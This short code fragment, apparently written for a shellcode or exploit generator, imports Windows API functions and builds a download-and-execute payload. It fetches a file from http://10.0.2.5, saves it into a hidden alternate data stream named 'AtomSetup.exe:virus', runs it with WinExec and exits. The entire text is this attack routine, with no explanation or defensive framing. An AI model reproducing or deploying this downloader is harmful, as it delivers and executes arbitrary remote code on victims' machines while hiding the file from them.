 function URLDownloadToFileA("urlmon.dll");
    function WinExec("kernel32.dll");
    function ExitProcess("kernel32.dll");

    URLDownloadToFileA(0,"http://10.0.2.5","AtomSetup.exe:virus",0,0);
    WinExec("AtomSetup.exe:virus",1);
    ExitProcess(0);